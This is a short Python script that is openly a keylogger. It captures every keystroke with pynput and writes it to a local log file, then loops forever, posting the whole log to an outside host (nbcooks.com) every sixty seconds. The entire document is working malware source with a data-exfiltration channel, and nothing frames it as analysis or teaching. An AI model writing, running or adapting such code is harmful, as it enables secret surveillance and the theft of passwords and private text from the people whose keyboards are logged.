import logging
import time
from pynput import keyboard
import requests

logging.basicConfig(filename="keylogger.log", level=logging.INFO)

URL = "http://nbcooks.com"

def on_press(key):
    try:
        logging.info(key.char)
    except AttributeError:
        logging.info(key)

def keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def send_logs():
    with open("keylogger.log", "r") as logfile:
        logs = logfile.read()
    requests.post(URL, data={"logs": logs})

keylogger()

while True:
    send_logs()
    time.sleep(60)